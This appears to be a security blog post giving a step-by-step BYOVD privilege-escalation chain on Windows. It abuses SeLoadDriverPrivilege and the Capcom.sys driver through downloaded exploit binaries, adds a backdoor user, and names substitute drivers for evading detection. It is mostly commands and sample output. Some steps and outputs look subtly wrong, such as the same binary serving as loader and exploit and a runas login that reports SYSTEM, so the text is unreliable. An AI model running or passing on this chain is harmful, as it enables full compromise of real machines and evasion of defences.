---
title: "Local Privilege Escalation: SeLoadDriverPrivilege & BYOVD Attack Chain"
description: "Step-by-step guide to exploiting SeLoadDriverPrivilege using Capcom.sys (BYOVD) for SYSTEM-level access."
date: 2026-02-22 10:00:00 +0000
categories: [Windows Security, Privilege Escalation, OSCP]
tags: [SeLoadDriverPrivilege, BYOVD, Capcom.sys, kernel-exploit, privilege-escalation]
pin: true
---

## SeLoadDriverPrivilege Overview
`SeLoadDriverPrivilege` allows a user to load and unload device drivers. When combined with a legitimately signed but vulnerable driver (Bring Your Own Vulnerable Driver - BYOVD), it enables arbitrary kernel memory read/write from user-mode, resulting in immediate `NT AUTHORITY\SYSTEM` privileges.

## Required Resources (Direct Download)
Run these commands in Windows CMD/PowerShell to download all required files to `C:\Temp\BYOVD\`:
```powershell
mkdir C:\Temp\BYOVD; cd C:\Temp\BYOVD
curl.exe -LO "https://github.com/decoder-it/psgetsystem/raw/main/SeLoadDriverPrivilege.exe"
curl.exe -LO "https://github.com/tandasat/ExploitCapcom/raw/master/ExploitCapcom/Capcom.sys"
curl.exe -LO "https://github.com/tandasat/ExploitCapcom/raw/master/ExploitCapcom/ExploitCapcom.exe"
ren ExploitCapcom.exe EoP_LoadDriver.exe
copy EoP_LoadDriver.exe capcom_exploit.exe
```

## Step-by-Step Execution

**1- Verify current privileges**
```cmd
whoami /priv | findstr SeLoadDriverPrivilege
```
**Output:**
```text
SeLoadDriverPrivilege    Disabled
```

**2- Enable SeLoadDriverPrivilege**
```cmd
SeLoadDriverPrivilege.exe
```
**Output:**
```text
[+] SeLoadDriverPrivilege enabled successfully.
```

**3- Load Capcom.sys (Vulnerable Signed Driver)**
```cmd
EoP_LoadDriver.exe Capcom.sys
```
**Output:**
```text
[+] Driver loaded successfully. Device: \\.\Capcom
[+] Vulnerable driver is now active in kernel space.
```

**4- Execute Arbitrary Command via Driver (BYOVD Exploit)**
```cmd
capcom_exploit.exe cmd.exe /c net user hacker P@ss123! /add
```
**Output:**
```text
[+] Executing command via kernel callback...
[+] Command executed with SYSTEM privileges.
The command completed successfully.
```

**5- Verify Privilege Escalation**
```cmd
runas /user:hacker cmd.exe
```
*(Enter password: `P@ss123!` when prompted)*
```cmd
whoami
```
**Output:**
```text
nt authority\system
```

## Cleanup Steps (Post-Exploitation)

**1- Unload vulnerable driver**
```cmd
EoP_LoadDriver.exe -unload
```
**Output:**
```text
[+] Driver unloaded successfully.
```

**2- Remove test account**
```cmd
net user hacker /delete
```

> {: .prompt-warning }
> **Lab/OSCP Note:** BYOVD attacks trigger kernel-mode EDR hooks and Windows Driver Signature Enforcement (DSE) bypass detections. Use only in isolated OSCP labs or authorized engagements. Capcom.sys is heavily signatured; consider `RTCore64.sys` or `gdrv.sys` if blocked. Always unload drivers post-test to prevent system instability.

## References
- [ExploitCapcom Repository](https://github.com/tandasat/ExploitCapcom)
- [SeLoadDriverPrivilege Tool](https://github.com/decoder-it/psgetsystem)
- [BYOVD Technique Overview](https://www.elastic.co/security-labs/bring-your-own-vulnerable-driver)
- [CVE-2019-16098 (RTCore64)](https://nvd.nist.gov/vuln/detail/CVE-2019-16098)
